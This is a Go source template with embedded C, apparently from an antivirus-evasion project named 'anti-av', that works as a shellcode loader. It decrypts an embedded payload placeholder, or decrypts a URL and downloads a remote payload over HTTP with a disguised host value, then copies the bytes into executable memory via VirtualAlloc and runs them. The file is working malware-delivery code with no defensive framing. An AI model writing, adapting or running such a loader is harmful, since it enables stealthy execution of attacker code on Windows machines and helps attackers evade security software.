package main

/*
#cgo windows CFLAGS: -DWIN=1

#include <stdio.h>

#if defined(WIN)
#include <Windows.h>
#endif

void sc(unsigned char *c, int c_len) {
	#if defined(WIN)
	printf("[*] alloc code memory\n");
	void *exec = VirtualAlloc(0, c_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, c, c_len);
	printf("[*] call code\n");
	((void(*)())exec)();
	#else
	printf("hello world!");
	#endif
}
*/
import "C"
import (
	"bytes"
	"fmt"
	"os"
	"unsafe"

	"github.com/b1gcat/anti-av/utils"
)

var (
	Code = []byte{{{CODE}}}
)

func SC() {
	payload()
	C.sc((*C.uchar)(unsafe.Pointer(&Code[0])), C.int(len(Code)))
	fmt.Println("[+] Bye~")
}

func payload() {
	if bytes.HasPrefix(Code, []byte{0x0, 0x0, 0x0, 0x0}) {
		url, err := utils.DeCrypt(Code)
		if err != nil {
			fmt.Println("[x] ", err.Error())
			os.Exit(0)
		}
		payload, err := utils.HttpGet(string(url), "www.baidu.com")
		if err != nil {
			fmt.Println("[x] ", err.Error())
			os.Exit(0)
		}
		Code = payload
	}
	payload, err := utils.DeCrypt(Code)
	if err != nil {
		fmt.Println("[x] ", err.Error())
		os.Exit(0)
	}

	Code = payload
}
